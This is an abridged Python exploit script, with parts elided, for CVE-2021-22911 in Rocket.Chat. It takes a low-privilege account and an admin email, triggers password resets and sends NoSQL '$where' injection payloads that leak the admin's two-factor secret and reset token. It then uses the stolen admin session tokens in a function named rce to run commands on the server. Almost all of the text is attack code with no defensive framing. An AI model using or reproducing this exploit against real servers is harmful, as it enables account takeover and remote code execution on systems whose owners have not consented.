...
CVE: CVE-2021-22911
0. -u Low priv user email
1. -a Administrator email
2. -t URL (Eg: http://rocketchat.local)
3. -p path (Eg: /api/v1/method.callAnon/)
...
parser.add_argument('-p', help='path (Eg: /api/v1/method.callAnon/)', required=True)
...
def forgotpassword(email,url):
	...
	r = requests.post(url,path, payload, headers = headers, verify = False, allow_redirects = False)
...
def changingpassword(url,token):
	...
	headers={'content-type': 'application/json'}
	r = requests.post(url+path, data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
...
def twofactor(url,email):
	...
	payload = '?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+path+payload,cookies=cookies,headers=headers)
	code = r.text[46:98]
...
def admin_token(url,email):
	...
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
	r = requests.get(url+path+payload,cookies=cookies,headers=headers)
	code = r.text[46:89]
...
def rce(url,code,cmd):
	...
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+path,cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
